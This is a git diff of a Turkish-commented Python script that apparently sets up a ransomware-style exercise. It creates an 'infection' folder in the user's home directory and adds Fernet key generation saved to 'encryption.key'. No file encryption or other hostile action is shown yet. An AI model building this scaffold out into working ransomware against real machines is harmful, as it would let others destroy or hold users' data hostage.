@@ -1,5 +1,6 @@
 import argparse
 import os
+from cryptography.fernet import Fernet
 
 
 header = r"""
@@ -53,6 +54,21 @@ def infectionFolder(home):
             print(f"Error: Could not create directory {infection_path}. Reason: {e}")
     return infection_path
 
+def generate_key():
+    key_file_path = "encryption.key"
+    
+    if os.path.exists(key_file_path):
+        with open(key_file_path, 'rb') as key_file:
+            key = key_file.read()
+            print("Key loaded from file.")
+    else:
+        key = Fernet.generate_key()
+        with open(key_file_path, 'wb') as key_file:
+            key_file.write(key)
+            print("New key generated and saved to encryption.key.")
+    
+    return key
+
 def main():
     args = arg_parse() #argümanları pars edip alıyorum
     silent = False
@@ -63,8 +79,9 @@ def main():
     elif args.silent:
         silent = args.silent
         print("sesiz moda geçti")
-    homePath = getHome(silent) #kullanıcnın home dizininin yolunu alıyorum path varmı yokmu bunun kontrollerini yapıyorum
-    infectionPath = infectionFolder(homePath, silent) #home dizinine infection adında bir dosya yoksa oluşturuyor
+    homePath = getHome() #kullanıcnın home dizininin yolunu alıyorum path varmı yokmu bunun kontrollerini yapıyorum
+    infectionPath = infectionFolder(homePath) #home dizinine infection adında bir dosya yoksa oluşturuyor
+    key = generate_key() #bana bir şifreleme anahtarı oluşturup dosyaya kaydediyor sonradan dosyaya kaydetme işin kaldırabilirim
 
 if __name__ == "__main__":
     main()
